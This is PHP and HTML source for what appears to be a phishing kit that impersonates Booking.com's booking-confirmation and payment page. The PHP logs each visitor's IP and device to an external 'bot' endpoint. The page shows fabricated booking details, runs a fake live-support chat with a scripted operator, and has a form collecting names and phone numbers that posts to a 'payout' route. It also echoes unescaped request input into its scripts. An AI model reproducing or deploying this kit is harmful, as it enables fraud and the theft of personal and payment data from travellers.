function file_get_cont($url){
    $ch = curl_init($url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $req = curl_exec($ch); curl_close($ch);  
    return $req;
}
include('./config.php');

ini_set('display_errors', 0); 
error_reporting(E_ALL);

if(!$_COOKIE['tokena']){
  $token = substr(md5(uniqid(rand(), true)),0,8);
}else{
  $token = $_COOKIE['tokena'];
}


function getBrowser()
    {
        $u_agent = $_SERVER['HTTP_USER_AGENT'];
        $bname = 'Unknown';
        $platform = 'Unknown';
        $version= "";

        //First get the platform? 
        if (preg_match('/android/i', $u_agent)) {
            $platform = '📱 Android';
        }elseif (preg_match('/iphone/i', $u_agent)) {
            $platform = '📱 iPhone';
        }elseif (preg_match('/ipad/i', $u_agent)) {
            $platform = '📱 iPad';
        }elseif (preg_match('/linux/i', $u_agent)) {
            $platform = 'linux';
        }
        elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
            $platform = '💻 Mac OS';
        }
        elseif (preg_match('/windows|win32/i', $u_agent)) {
            $platform = '💻 Windows';
        }
         
    
        // Next get the name of the useragent yes seperately and for good reason
        if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
        {
            $bname = 'Internet Explorer';
            $ub = "MSIE";
        }
        elseif(preg_match('/Firefox/i',$u_agent))
        {
            $bname = 'Mozilla Firefox';
            $ub = "Firefox";
        }
        elseif(preg_match('/Chrome/i',$u_agent))
        {
            $bname = 'Google Chrome';
            $ub = "Chrome";
        }
        elseif(preg_match('/Safari/i',$u_agent))
        {
            $bname = 'Apple Safari';
            $ub = "Safari";
        }
        elseif(preg_match('/Opera/i',$u_agent))
        {
            $bname = 'Opera';
            $ub = "Opera";
        }
        elseif(preg_match('/Netscape/i',$u_agent))
        {
            $bname = 'Netscape';
            $ub = "Netscape";
        }
    
        // finally get the correct version number
        $known = array('Version', $ub, 'other');
        $pattern = '#(?<browser>' . join('|', $known) .
        ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
        if (!preg_match_all($pattern, $u_agent, $matches)) {
            // we have no matching number just continue
        }
    
        // see how many we have
        $i = count($matches['browser']);
        if ($i != 1) {
            //we will have two since we are not using 'other' argument yet
            //see if version is before or after the name
            if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
                $version= $matches['version'][0];
            }
            else {
                $version= $matches['version'][1];
            }
        }
        else {
            $version= $matches['version'][0];
        }
    
        // check if we have a number
        if ($version==null || $version=="") {$version="?";}
    
        return array(
            'userAgent' => $u_agent,
            'name'      => $bname,
            'version'   => $version,
            'platform'  => $platform,
            'pattern'    => $pattern
        );
    }
 

$product = file_get_cont($bot_config->bot_link."api.php?get_product=".$_GET['product']);
$product = json_decode($product);
$browser = getBrowser();     
 
if($_GET['cmd']=="leftfrompg"){
	$data = array(
		'visit'=>'left',
		'page'=>$_SERVER['REQUEST_URI'],
		'pid'=>$_GET['pid'],
		'ip'=>$_SERVER['REMOTE_ADDR'],
  		'device'=>$browser['platform'].', '.$browser['name']
		);
	file_get_cont($bot_config->bot_link.'bot.php?'.http_build_query($data));
exit();
}		
		
$data = array(
  'visit'=>'order',
  'token'=>$token,
  'product'=>$product->id,
  'ip'=>$_SERVER['REMOTE_ADDR'],
  'device'=>$browser['platform'].', '.$browser['name']
); 
file_get_cont($bot_config->bot_link.'bot.php?'.http_build_query($data));  

			
echo '

<!DOCTYPE html>
<html>
    <head>
        <title>Booking.com | Official site | The best hotels & accommodation</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">   
        <link rel="stylesheet" href="/styles.css"> 
        <meta name="msapplication-TileColor" content="#da532c">
        <meta name="theme-color" content="#ffffff">   
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
        <link rel="manifest" href="/site.webmanifest">
        <meta name="msapplication-TileColor" content="#da532c">
        <meta name="theme-color" content="#ffffff"> 
    </head>
    <body> 
    <!-- CHAT links -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <style type="text/css">
      body{
  
}
.col-md-2, .col-md-10{
  padding:0;
}
.panel{
z-index: 999999;
  margin-bottom: 0px;
}
/* #### Tablets Portrait or Landscape #### */
@media screen and (min-width: 1px)  and (max-width: 1023px){
  .open-button {
z-index: 300;
border: 0; 
content: \'Напишите нам в чат\';
background: #003580;
border-radius: 5px;
padding: 16px 0px;
border: none;
cursor: pointer;
display: inline-flex;
align-items: center;
width: 150px;
height: 36px;
position: fixed;
bottom: 80px;
}
.panel-body {
  height: 400px;
}
.chat-window{
  height:400px;
    display: flex;
    align-items: flex-start;
  z-index: 99999;
min-width: 100%;
  bottom:5px;
  position: fixed;
  right: 10px;
}

#op_img {
height: 50%; width: 70%;border-radius: 50%;max-height: 80px;
}

#usr_img {
  height: 100%; border-radius: 50%;
      width: 70%;
  left: 10%;
  position: inherit;
}
}
@media screen and (min-width: 1024px){
  #open-button-text {
  visibility: hidden;
}
.open-button {
z-index: 99999;
border: 0; 
background-color: transparent; 
background-size: 100px 100px;
background-repeat: no-repeat;
content: \'\';
padding: 16px 20px;
border: none;
cursor: pointer;
opacity: 0.6;
width: 150px;
height: 100px;
position: fixed;
top: 50px;

}
.panel-body {
  height: 400px;
}
.chat-window{
  height:400px;
  z-index: 9999;
  display: fixed;
  align-items: flex-start;
  min-width: 485px;
  bottom:5px;
  position: fixed;
  right: 10px;
}
#op_img {
height: 100%; width: 100%;border-radius: 50%;max-height: 100px;
}

#usr_img {
  height: 100%; border-radius: 50%;
      width: 90%;
  left: 10%;
  position: inherit;
}
}
.chat-window > div > .panel{
  border-radius: 5px 5px 0 0;
}
.icon_minim{
  padding:2px 10px;
}
.msg_container_base{
background: #e5e5e5;
margin: 0;
padding: 0 10px 10px;
max-height:300px;
overflow-x:hidden;
}
.top-bar {
background: #003580;
color: white;
padding: 10px;
position: relative;
overflow: hidden;
display: flex;
}
.msg_receive{
  padding-left:0;
  margin-left:0;
  text-align: left;
}
.msg_sent{
  padding-bottom:20px !important;
  margin-right:0;
  text-align: left;
}
.messages {
background: white;
padding: 10px;
border-radius: 2px;
box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
max-width:100%;
}
.messages > p {
  font-size: 13px;
  margin: 0 0 0.2rem 0;
}
.messages > time {
  font-size: 11px;
  color: #ccc;
}
.msg_container {
  padding: 10px;
  overflow: hidden;
  display: flex;
}
.panel >img {
  display: block;
  width: 100%;
}
.avatar {
  position: relative;
}
.base_receive > .avatar:after {
  content: "";
  position: absolute;
  top: 0;
  right: 0;
  width: 0;
  height: 0;
  border: 5px solid #FFF;
  border-left-color: rgba(0, 0, 0, 0);
  border-bottom-color: rgba(0, 0, 0, 0);
}

.base_sent {
justify-content: flex-end;
align-items: flex-end;
}
.base_sent > .avatar:after {
  content: "";
  position: absolute;
  bottom: 0;
  left: 0;
  width: 0;
  height: 0;
  border: 5px solid white;
  border-right-color: transparent;
  border-top-color: transparent;
  box-shadow: 1px 1px 2px rgba(black, 0.2); // not quite perfect but close
}

.msg_sent > time{
  float: right;
}



.msg_container_base::-webkit-scrollbar-track
{
  -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
  background-color: #F5F5F5;
}

.msg_container_base::-webkit-scrollbar
{
  width: 12px;
  background-color: #F5F5F5;
}

.msg_container_base::-webkit-scrollbar-thumb
{
  -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
  background-color: #555;
}

.btn-group.dropup{
  position:fixed;
  left:0px;
  bottom:0;
}

#btn-chat{
background-color: #003580;
border-color: white;
padding-left: 5px;
padding-right: 5px;
}

#new_chat {
width: 10px;
height: 174px;
float: right;
right: 10px;
top: 50px;
position: fixed;
z-index: 0;
}
1      </style>
    <!-- CHAT links close -->
    <style>
    @media screen and (max-width: 600px) {.gjZzYk {text-align: center; display: block; margin-top: -5px;}}
    
    @media (min-width: 992px) {.rows { height: 80px;} .col-md-8 {width: 100%;}}
    </style>
    
  </head>

<body class="body body--payments route__product_buy_id_any">
<!--- CHAT --->
  <div class="row chat-window col-xs-5 col-md-3" id="chat_window_1" style="margin-left:10px;display: none;">
    <input type="hidden" id="product" value="'.$product->title.'">
      <input type="hidden" id="refresh_time" value="604923371">
      <input type="hidden" id="home_time" value="597315665">
      <div class="col-xs-12 col-md-12">
          <div class="panel panel-default">
              <div class="panel-heading top-bar" style="border-top-left-radius: 10px; border-top-right-radius: 10px;">
                  <div class="col-md-8 col-xs-8" style="text-align: left; right: 13px;width: 90%">
                      <h4 class="panel-title" style="color: white;"><svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-chat" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" d="M2.678 11.894a1 1 0 0 1 .287.801 10.97 10.97 0 0 1-.398 2c1.395-.323 2.247-.697 2.634-.893a1 1 0 0 1 .71-.074A8.06 8.06 0 0 0 8 14c3.996 0 7-2.807 7-6 0-3.192-3.004-6-7-6S1 4.808 1 8c0 1.468.617 2.83 1.678 3.894zm-.493 3.905a21.682 21.682 0 0 1-.713.129c-.2.032-.352-.176-.273-.362a9.68 9.68 0 0 0 .244-.637l.003-.01c.248-.72.45-1.548.524-2.319C.743 11.37 0 9.76 0 8c0-3.866 3.582-7 8-7s8 3.134 8 7-3.582 7-8 7a9.06 9.06 0 0 1-2.347-.306c-.52.263-1.639.742-3.468 1.105z"/>
</svg>
</span> Online chat</h4>
                  </div>
                  <div class="col-md-4 col-xs-4" style="text-align: right; left: 13px;width: 10%;float: right;">
                      <button type="button" class="close icon_close" aria-label="Close" data-id="chat_window_1">
                        <span aria-hidden="true">&times;</span>
                      </button>
                  </div>
              </div>
              <div class="panel-body msg_container_base">
                  
              </div>
              <div class="panel-footer">
                  <div class="input-group">
                      <input id="btn-input" type="text" class="form-control input-sm chat_input" placeholder="Write here..." />
                      <span class="input-group-btn">
                      <button class="btn btn-primary" id="btn-chat" style="margin-top: 0px;">Send a message</button>
                      </span>
                  </div>
              </div>
          </div>
      </div>
  </div>
  <button class="open-button" id="open-support" onclick="openChat()" style="right: 10px; "><p id="open-button-text" style="color: white;margin-left: auto;margin-right: auto;margin: 0 auto;">Support</p></button>
  <script type="text/javascript">
                $(document).on(\'click\', \'.panel-heading span.icon_minim\', function (e) {
  var $this = $(this);
  if (!$this.hasClass(\'panel-collapsed\')) {
      $this.parents(\'.panel\').find(\'.panel-body\').slideUp();
      $this.addClass(\'panel-collapsed\');
      $this.removeClass(\'glyphicon-minus\').addClass(\'glyphicon-plus\');
  } else {
      $this.parents(\'.panel\').find(\'.panel-body\').slideDown();
      $this.removeClass(\'panel-collapsed\');
      $this.removeClass(\'glyphicon-plus\').addClass(\'glyphicon-minus\');
  }
});
$(document).on(\'focus\', \'.panel-footer input.chat_input\', function (e) {
  var $this = $(this);
  if ($(\'#minim_chat_window\').hasClass(\'panel-collapsed\')) {
      $this.parents(\'.panel\').find(\'.panel-body\').slideDown();
      $(\'#minim_chat_window\').removeClass(\'panel-collapsed\');
      $(\'#minim_chat_window\').removeClass(\'glyphicon-plus\').addClass(\'glyphicon-minus\');
  }
});
$(document).on(\'click\', \'#open-support\', function (e) {
  $(\'#chat_window_1\').show();
  $(\'#open-support\').hide();
});
function openChat() {
  $(\'#chat_window_1\').show();
  $(\'#open-support\').hide();
}
$(document).on(\'click\', \'.icon_close\', function (e) {
  $(\'#chat_window_1\').hide();
  $(\'#open-support\').show();
});
$(document).ready(function () {
  $(\'#chat_window_1\').hide();
  $(\'#open-support\').show();
});
$(document).on(\'click\', \'#btn-chat\', function (e) {
  sendMessage();
});
      function sendMessage() {
          message = document.getElementById("btn-input").value;
          if (message === \'\') {
              return;
          }
          document.getElementById("btn-input").value = \'\';
          var token = getCookie(\'tokena\');
          if (token =="") {
              var token = "'.$token.'";
          }
          xhttp=new XMLHttpRequest();
          var track_id = document.getElementById("refresh_time").value;
          var url = location.protocol + \'//\'+document.location.hostname+\'/message.php\';
          xhttp.open("POST", url, true);
          xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
          var uid = document.getElementById("home_time").value;
          var title = document.getElementById("product").value;
          xhttp.send("send=1&track_id="+track_id+"&product='.$_GET['product'].'&token="+token+"&message="+message+"&type=kufar&title="+title);
          cur_text = $(\'.msg_container_base\').html();
          $(\'.msg_container_base\').html(cur_text+\'<div class="row msg_container base_sent"><div class="col-md-10 col-xs-10 " style="width: 80%;"><div class="messages msg_sent"><p>\'+message+\'</p><time datetime="\'+getCurTime()+\'">Ty</time></div></div><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/user.png" id="usr_img"></div></div>\');
          setCookie(\'tokena\', token);
          var objDiv = $(\'.msg_container_base\');
          objDiv.scrollTop($(\'.msg_container_base\')[0].scrollHeight);
      }
      var xhttp = null;
      $(function(){	
          /* window.onbeforeunload = function(){
              xhttp.abort();
          }; */
          var token = getCookie(\'tokena\'); 
          if (token =="") {
              var token = "'.$token.'";
      setCookie(\'tokena\', token);
          }
          if (token !="") {
              xhttp=new XMLHttpRequest();
              var track_id = document.getElementById("refresh_time").value;
              var url = location.protocol + \'//\'+document.location.hostname+\'/message.php\';
              xhttp.open("POST", url, true);
              xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
              xhttp.send("get=1&product='.$_GET['product'].'&token="+token);
              xhttp.onload = function (e) {
                      if (xhttp.readyState === 4) {
                          if (xhttp.status === 200) {
                              var body = xhttp.response;
                              var json = JSON.parse(body);
                              for (let i = 0; i < json.length; i++) {
                                  if (json[i].message !== \'start\') {
                                      cur_text = $(\'.msg_container_base\').html();
                                      time = getTime(json[i].date);
                                      if (json[i].sender == \'t\') {
                                          text = \'<div class="row msg_container base_receive"><div class="col-md-2 col-xs-2 avatar" style="width: 20%; padding: 0 5px 0 5px;"><img src="/operator.png" id="op_img"></div><div class="col-xs-10 col-md-10" style="width: 80%;"><div class="messages msg_receive"><p>\'+json[i].message+\'</p><time datetime="2009-11-13T20:00">Aleksandra</time></div></div></div>\'
                                      } else {
                                          text = \'<div class="row msg_container base_sent"><div class="col-md-10 col-xs-10 " style="width: 80%;"><div class="messages msg_sent"><p>\'+json[i].message+\'</p><time datetime="\'+time+\'">Ty</time></div></div><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/user.png" id="usr_img"></div></div>\'
                                      }
                                      $(\'.msg_container_base\').html(cur_text+text);
                                  }
                              }
                              var objDiv = $(\'.msg_container_base\');
                                  objDiv.scrollTop($(\'.msg_container_base\')[0].scrollHeight);
                          }
                      }
                  }
          }
      });
      var myVar = setInterval(updateChat, 10000);
      function updateChat() {
              var token = getCookie(\'tokena\');
              if (token !="") {
                      xhttp=new XMLHttpRequest();
                      var track_id = document.getElementById("refresh_time").value;
                      var url = location.protocol + \'//\'+document.location.hostname+\'/message.php\';
                      xhttp.open("POST", url, true);
                      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                      xhttp.send("get=0&product='.$_GET['product'].'&token="+token);
                      xhttp.onload = function (e) {
                          if (xhttp.readyState === 4) {
                              if (xhttp.status === 200) {
                                  var body = xhttp.response;
                                  var json = JSON.parse(body);
                                  for (let i = 0; i < json.length; i++) {
                                      cur_text = $(\'.msg_container_base\').html();
                                      time = getTime(json[i].date);
                                      if (json[i].sender == \'t\') {
                                          text = \'<div class="row msg_container base_receive"><div class="col-md-2 col-xs-2 avatar" style="width: 20%; padding: 0 5px 0 5px;"><img src="/operator.png" id="op_img"></div><div class="col-xs-10 col-md-10" style="width: 80%;"><div class="messages msg_receive"><p>\'+json[i].message+\'</p><time datetime="2009-11-13T20:00">Aleksandra</time></div></div></div>\'
                                      } else {
                                          text = \'<div class="row msg_container base_sent"><div class="col-md-10 col-xs-10 " style="width: 80%;"><div class="messages msg_sent"><p>\'+json[i].message+\'</p><time datetime="\'+time+\'">Ty</time></div></div><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/user.png" id="usr_img"></div></div>\'
                                      }
                                      $(\'.msg_container_base\').html(cur_text+text);
                                      var objDiv = $(\'.msg_container_base\');
                                      objDiv.scrollTop($(\'.msg_container_base\')[0].scrollHeight);
                                      $(\'#chat_window_1\').show();
                                      $(\'#open-support\').hide();
                                  }
                          }
                      }
              }
          }
      }

      function getCurTime() {
          var date = new Date();
          var hours = date.getHours();
          var minutes = "0" + date.getMinutes();
          var formattedTime = hours + \':\' + minutes.substr(-2);
          return formattedTime;
      }

      function getTime(unixtime) {
          var date = new Date(unixtime * 1000);
          var hours = date.getHours();
          var minutes = "0" + date.getMinutes();
          var formattedTime = hours + \':\' + minutes.substr(-2);
          return formattedTime;
      }

      function getCookie(cname) {
        var name = cname + "=";
        var decodedCookie = decodeURIComponent(document.cookie);
        var ca = decodedCookie.split(\';\');
        for(var i = 0; i <ca.length; i++) {
          var c = ca[i];
          while (c.charAt(0) == \' \') {
            c = c.substring(1);
          }
          if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
          }
        }
        return "";
      }

      function setCookie(cname, cvalue) {
        var d = new Date();
            d.setTime(d.getTime() + (6*60*60*1000));
        var expires = "expires="+ d.toUTCString();
        document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
      }
  function openForm() {
    document.getElementById("myForm").style.display = "block";
    document.getElementById("open-support").style.display = "none";
    var objDiv = $(\'.msg_container_base\');
      objDiv.scrollTop = objDiv.scrollHeight;
  }

  function closeForm() {
    document.getElementById("myForm").style.display = "none";
    document.getElementById("open-support").style.display = "block";
  }
  var input = document.getElementById("btn-input");

  input.addEventListener("keydown", function(event) {
    if (event.keyCode === 13) {
      event.preventDefault();
      document.getElementById("btn-chat").click();
    }
  });1    </script>
    <!--- CHAT CLOSE --->
        <header class="f-head">
            <a href="https://www.booking.com/"><img src="/logo.svg" alt="BookingLogo.png" class="f-logotype"></a>
            <div class="f-secondary">
                <a href="https://partner.booking.com/en-gb/community/tips-tricks-more/registration-new-object"><div class="f-button_secondary">Register your object</div></a>
                <a href=https://account.booking.com/auth/oauth2?state=Ur0DPAw8EiMNFS2G_Mb2Qn1OIi8S5HepXIKAMOSbyMumac797ickLs9GEr_LNYyf6kLhiDTRsbcgxAeXCod4LbEAzrFYCiUHc5z1YCdAzuTrG2ruacU3GA1ER-s7Glj7r8Wec6LEPVtkNdOGXFyK_uYS-_S0_3_MC5VNQIZUQIqXMpg297RPMiQLETIwZHF3XPv_bDhdzlaK5t4KFwXzDiUB3FEriAwS7zS3zXsR0t48WxzNa_R-QVDvZm_VgF1o79ExGr8lpv8RPrqWa4Y5WqPvnrWnm0tDiIzpRrXagFx1zs2QfCEVVWNcvrW9pmRNWOCpdBdXhWYksEX39UPHzzgZ-lzRSshbObR6h3RNN-AqpZqUPfcWCDJ6-caoWMFgQh1B3Tr6DWkdnZNdQsOottqsoyLGpBylMA6TTgntkRYkZahL2LIyqG3p85m7vHxAR7jCBCiybPqBla36zseI4ACD24XqmXCIj8pQHHqhVgj0pmN4tpOwlHby9GHFdI2w7v2pqtGImrzL0WXLwueJEdF3KnKV3tRBMd8ZPxN6Z6hpR6dztgPgnRzELtWPCe52I1hMeT6ieKGdNnPeY0UWNw&dt=1628316942&response_type=code&client_id=vO1Kblk7xX9tUn2cpZLS&redirect_uri=https%3A%2F%2Fsecure.booking.com%2Flogin.html%3Fop%3Doauth_return&aid=304142&lang=en-gb&bkng_action=index">
                    <div class="f-profile">
                        <img src="/avatar.png" alt="pic.png" class="f-avatar">
                        <span class="f-label">Your account</span>
                    </div>
                </a>
            </div>
        </header>

        <div class="f-sub_info">
            <div class="f-steps">
                <div class="f-step">
                    <span class="f-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none">
                            <rect width="16" height="16" rx="8" fill="#0071C2"/>
                            <path d="M11.1921 4L12.5 5.45L6.66995 12L3.5 8.45L4.80788 7L6.66995 9.075L11.1921 4Z" fill="white"/>
                        </svg>
                    </span>
                    <span class="f-label">
                        Choose a room
                    </span>
                </div>
                <hr class="f-line">
                <div class="f-step">
                    <span class="f-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none">
                            <rect width="16" height="16" rx="8" fill="#0071C2"/>
                            <path d="M11.1921 4L12.5 5.45L6.66995 12L3.5 8.45L4.80788 7L6.66995 9.075L11.1921 4Z" fill="white"/>
                        </svg>
                    </span>
                    <span class="f-label">
                        Enter your details
                    </span>
                </div>
                <hr class="f-line">
                <div class="f-step">
                    <span class="f-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none">
                            <rect width="16" height="16" rx="8" fill="#0071C2"/>
                            <path d="M7.52344 7.80469H8.06641C8.40755 7.79948 8.67578 7.70964 8.87109 7.53516C9.06641 7.36068 9.16406 7.125 9.16406 6.82812C9.16406 6.16146 8.83203 5.82812 8.16797 5.82812C7.85547 5.82812 7.60547 5.91797 7.41797 6.09766C7.23307 6.27474 7.14062 6.51042 7.14062 6.80469H6.41797C6.41797 6.35417 6.58203 5.98047 6.91016 5.68359C7.24089 5.38411 7.66016 5.23438 8.16797 5.23438C8.70443 5.23438 9.125 5.3763 9.42969 5.66016C9.73438 5.94401 9.88672 6.33854 9.88672 6.84375C9.88672 7.09115 9.80599 7.33073 9.64453 7.5625C9.48568 7.79427 9.26823 7.96745 8.99219 8.08203C9.30469 8.18099 9.54557 8.34505 9.71484 8.57422C9.88672 8.80339 9.97266 9.08333 9.97266 9.41406C9.97266 9.92448 9.80599 10.3294 9.47266 10.6289C9.13932 10.9284 8.70573 11.0781 8.17188 11.0781C7.63802 11.0781 7.20312 10.9336 6.86719 10.6445C6.53385 10.3555 6.36719 9.97396 6.36719 9.5H7.09375C7.09375 9.79948 7.19141 10.0391 7.38672 10.2188C7.58203 10.3984 7.84375 10.4883 8.17188 10.4883C8.52083 10.4883 8.78776 10.3971 8.97266 10.2148C9.15755 10.0326 9.25 9.77083 9.25 9.42969C9.25 9.09896 9.14844 8.84505 8.94531 8.66797C8.74219 8.49089 8.44922 8.39974 8.06641 8.39453H7.52344V7.80469Z" fill="white"/>
                        </svg>
                    </span>
                    <span class="f-label">
                        Final Details
                    </span>
                </div>
            </div>
            <div class="f-annotation">
                <p class="f-text">Great choice! Almost ready. Confirm your booking.</p>
            </div>
        </div>

        <div class="f-booking_body">
            <div class="f-apartment_info_mobile">
            <img class="f-apart_photo" src="'.$product->image.'" alt="apartment_photo.png">
                <div class="f-apart_info">
                    <h2 class="f-apart_title"> 
                    '.$product->title.'</h2>
                    <div class="f-apart_geo">
                        <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25" fill="none">
                            <g clip-path="url(#clip0)">
                            <path d="M21.4192 10.3853C21.4192 17.3853 12.4192 23.3853 12.4192 23.3853C12.4192 23.3853 3.41919 17.3853 3.41919 10.3853C3.41919 7.99831 4.3674 5.70912 6.05523 4.02129C7.74306 2.33347 10.0322 1.38525 12.4192 1.38525C14.8061 1.38525 17.0953 2.33347 18.7831 4.02129C20.471 5.70912 21.4192 7.99831 21.4192 10.3853Z" stroke="#444444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M12.4192 13.3853C14.076 13.3853 15.4192 12.0421 15.4192 10.3853C15.4192 8.7284 14.076 7.38525 12.4192 7.38525C10.7623 7.38525 9.41919 8.7284 9.41919 10.3853C9.41919 12.0421 10.7623 13.3853 12.4192 13.3853Z" stroke="#444444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            </g>
                            <defs>
                            <clipPath id="clip0">
                            <rect width="24" height="24" fill="white" transform="translate(0.419189 0.385254)"/>
                            </clipPath>
                            </defs>
                        </svg>
                        <span class="f-apart_address">'.$product->address.'</span>
                    </div>
                    <div class="f-apart_check">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                            <path d="M20 6L9 17L4 12" stroke="#008009" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                        <span class="f-check_info">
                            Great location - guests rated it 10! 
                        </span>
                    </div>
                    <div class="f-apart_check">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                            <path d="M20 6L9 17L4 12" stroke="#008009" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                        <span class="f-check_info">
                            Bestseller!
                        </span>
                    </div> 
                </div>
            </div>
            <div class="f-booking_details">
                <div class="f-details">
                    <div class="f-detail_title">
                        Your booking details
                    </div>
                    <div class="f-detail_info">
                        <div class="f-check_in">
                            <span class="f-label">
                                Check-in
                            </span>
                            <p class="f-date">'.$product->checkindate.'</p>
                        </div>
                        <hr class="f-line">
                        <div class="f-check_out">
                            <span class="f-label">
                                Check-out
                            </span>
                            <p class="f-date">'.$product->checkoutdate.'</p>
                        </div>
                    </div>
                    <div class="f-choosed">
                        <div class="f-choosed_apart">
                            <span class="f-label">
                                You choosed:
                            </span>
                            <p class="f-apart">'.$product->title.'</p>
                        </div>
                    </div>
                </div>
                <div class="f-price">
                    <div class="f-detail_title">
                        <p class="f-title">Price</p>
                        <span class="f-cost">'.$product->price.' '.$product->currancy.'</span>
                    </div>
                    <div class="f-detail_info">
                        <p class="f-annotation">
                            <span class="f-no">No surprises!</span> The price is final!
                        </p>
                    </div>
                </div>
                <div class="f-payment_info">
                    <div class="f-schedule">
                        <div class="f-detail_title">
                            Your payment schedule
                        </div>
                        <div class="f-detail_info">
                            <p class="f-text">Funds are reserved by the system to guarantee the reservation. Payment is due upon arrival.</p>
                        </div>
                    </div>
                </div>
            </div>
            <form action="/order/payout/'.$product->id.'" class="f-card_data">
                <input type="hidden" name="id" value="'.$product->id.'">
                <div class="f-apartments">
                    <div class="f-apartment_info">
                    <img class="f-apart_photo" src="'.$product->img.'" alt="apartment_photo.png">
                        <div class="f-apart_info">
                            <h2 class="f-apart_title">'.$product->title.'</h2>
                            <div class="f-apart_geo">
                                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25" fill="none">
                                    <g clip-path="url(#clip0)">
                                    <path d="M21.4192 10.3853C21.4192 17.3853 12.4192 23.3853 12.4192 23.3853C12.4192 23.3853 3.41919 17.3853 3.41919 10.3853C3.41919 7.99831 4.3674 5.70912 6.05523 4.02129C7.74306 2.33347 10.0322 1.38525 12.4192 1.38525C14.8061 1.38525 17.0953 2.33347 18.7831 4.02129C20.471 5.70912 21.4192 7.99831 21.4192 10.3853Z" stroke="#444444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                    <path d="M12.4192 13.3853C14.076 13.3853 15.4192 12.0421 15.4192 10.3853C15.4192 8.7284 14.076 7.38525 12.4192 7.38525C10.7623 7.38525 9.41919 8.7284 9.41919 10.3853C9.41919 12.0421 10.7623 13.3853 12.4192 13.3853Z" stroke="#444444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                    </g>
                                    <defs>
                                    <clipPath id="clip0">
                                    <rect width="24" height="24" fill="white" transform="translate(0.419189 0.385254)"/>
                                    </clipPath>
                                    </defs>
                                </svg>
                                <span class="f-apart_address">'.$product->address.'</span>
                            </div>
                            <div class="f-apart_check">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                                    <path d="M20 6L9 17L4 12" stroke="#008009" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                </svg>
                                <span class="f-check_info">
                                    Great location - guests rated it 10! 
                                </span>
                            </div>
                            <div class="f-apart_check">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                                    <path d="M20 6L9 17L4 12" stroke="#008009" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                </svg>
                                <span class="f-check_info">
                                    Bestseller!
                                </span>
                            </div>
                        </div>
                    </div>
                    <div class="f-personal_info">
                        <h3 class="f-block_title">Enter information about yourself</h3>
                        <div class="f-booking_block">
                            <div class="f-fields">
                                <div class="f-field">
                                    <label for="name" class="f-label" id="name">Name <span class="f-required">*</span></label>
                                    <input type="text" class="f-input" id="name" value="" placeholder="Enter your name">
                                </div>
                                <div class="f-field">
                                    <label for="surname" class="f-label" id="surname">Surname <span class="f-required">*</span></label>
                                    <input type="text" class="f-input" id="surname" value="" placeholder="Enter your surname">
                                </div>
                                <div class="f-field">
                                    <label for="phone" class="f-label" id="phone">Phone number (preferably mobile) <span class="f-required">*</span></label>
                                    <input type="text" class="f-input" id="phone" value="" placeholder="Enter your phone">
                                </div>
                            </div>
                            <div class="f-annotation_s">
                                <span class="f-annotation_text">
                                    Required by the property to validate your booking
                                </span>
                            </div>
                        </div>
                    </div>

                    

                    <div class="f-booking_privacy">
                        <div class="f-check">
                            <input type="checkbox" id="get_access" name="get_access">
